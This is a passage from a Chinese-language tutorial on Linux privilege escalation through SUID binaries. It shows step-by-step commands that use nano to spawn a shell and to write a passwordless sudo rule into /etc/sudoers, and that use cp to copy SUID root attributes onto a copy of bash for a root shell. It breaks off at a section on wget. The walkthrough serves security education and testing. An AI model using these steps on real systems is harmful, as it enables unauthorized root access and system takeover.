<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">/bin/nano -s /bin/sh</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/bin/sh</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">^T</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="data:image/png;base64,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" width="390" height="59" class="img_ev3q"></p>
<p>有趣的是 它成功了，但是我们在这里可以看到，我们最终也只是以之前相同的用户身份进入了 shell。</p>
<p>接下来，我们知道 <strong>nano</strong> 的目的是编辑文件，所以我们可以利用这些知识尝试写入敏感文件。</p>
<p>一些有助于提升权限的文件示例包括 <strong>/etc/passwd、/etc/shadow、/etc/sudoers</strong>。</p>
<p>对于此示例，我们将在 /etc/sudoers 文件中添加一行，为当前用户提供完整的 <strong>sudo</strong> 权限。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">/bin/nano /etc/sudoers</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>打开后，我们可以在文件底部添加以下行，然后退出：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">user ALL=(ALL) NOPASSWD: ALL</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240705190625873-334118428-35e8bb64f3381c3653079c7dbc3ae93b.png" width="574" height="409" class="img_ev3q"></p>
<p>默认情况下，标准用户无法读取 <strong>sudoers</strong> 文件，但我们仍然可以确认它有效。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sudo -l</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240705190625852-1801200712-8387f161421e26c444ebadc65c0f31d7.png" width="514" height="92" class="img_ev3q"></p>
<p>Perfect！现在我们可以使用以下命令轻松进入 root shell：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sudo su -</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240705190625881-1351499902-c07e9c88fa0dc966f21504e4e2043786.png" width="513" height="108" class="img_ev3q"></p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="43利用需要一些创造力的二进制文件--cpwget"><strong><div id="id4.3">4.3、利用需要一些创造力的二进制文件 – cp/wget</div></strong><a href="#43利用需要一些创造力的二进制文件--cpwget" class="hash-link" aria-label="43利用需要一些创造力的二进制文件--cpwget的直接链接" title="43利用需要一些创造力的二进制文件--cpwget的直接链接">​</a></h4>
<p>对于第 1 部分中最后一组示例，我们将回顾两个有趣的二进制文件，它们需要一些发散性思维才能升级到 root。</p>
<p>任何不属于其他两类（易 shell 或读/写）的 SUID 二进制文件，通常都需要一些创造力才能使漏洞利用发挥作用。</p>
<h6 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="431将-suid-权限注入-bash--cp"><strong><div id="id4.3.1">4.3.1、将 SUID 权限注入 bash – cp</div></strong><a href="#431将-suid-权限注入-bash--cp" class="hash-link" aria-label="431将-suid-权限注入-bash--cp的直接链接" title="431将-suid-权限注入-bash--cp的直接链接">​</a></h6>
<p>我们首先查看 GTFOBins 上的 <a href="https://gtfobins.github.io/gtfobins/cp/" target="_blank" rel="noopener noreferrer" title="cp">cp</a> 命令，看看如何利用这个二进制文件。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240705190626113-1205676390-16a9fbcdc16e59eebeb5fd56edee7639.png" width="832" height="653" class="img_ev3q"></p>
<p>首先进入 SUID 部分，我们可以看到它提供了三个漏洞。前两个是文件写入漏洞；然而，第三个漏洞非常有趣，它通过将 SUID 权限从一个二进制文件复制到另一个二进制文件来更改文件。</p>
<p>由于 <strong>cp</strong> 本身具有 SUID 权限，这意味着我们可以使用 <strong>cp</strong> 将其自己的 SUID 权限注入到我们想要注入的任何二进制文件中！</p>
<p>此漏洞不仅会将 SUID 权限注入到任何其他二进制文件中，还会注入 cp 上设置的所有权限（包括文件所有权）。</p>
<p>为了利用这一点，我们需要考虑一个想要添加 SUID 权限的二进制文件。</p>
<p>为了轻松地提升权限，第一个想到的二进制文件是 <strong>bash</strong>。</p>
<p>根据最佳实践，如果没有必要，我们不应直接编辑系统二进制文件。相反，我们可以用 cp 将要注入的二进制文件复制到 /tmp 目录，然后注入该副本。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cp /bin/bash /tmp</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240705190625238-1533091162-d2601bb43d4443a5fda1127571048848.png" width="447" height="65" class="img_ev3q"></p>
<p>由于 <strong>cp</strong> 具有 SUID 权限，它将 root 保留为文件所有者，但它确实将我们当前的用户 “user” 指定为组所有者。</p>
<p>但是，当我们将 <strong>cp</strong> 的权限注入到我们的 <strong>bash</strong> 副本中时，我们将看到所有权将从 root：user变为 root：root。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">/bin/cp --attributes-only --preserve=all /bin/cp /tmp/bash</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240705190625858-666382974-68d99527a49a4ab969de74e0a1f8b99c.png" width="697" height="62" class="img_ev3q"></p>
<p>无论如何，现在，我们只需发出命令便可以进入 root shell。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">/tmp/bash -p</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240705190625150-266980457-abbd5764209328fdcf8ecf87e5bcb75b.png" width="500" height="78" class="img_ev3q"></p>
<h6 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="432下载新的-passwd-文件--wget"><strong><div id="id4.3.2">4.3.2、下载新的 passwd 文件 – wget</div></strong><a href="#432下载新的-passwd-文件--wget" class="hash-link" aria-label="432下载新的-passwd-文件--wget的直接链接" title="432下载新的-passwd-文件--wget的直接链接">​</a></h6>
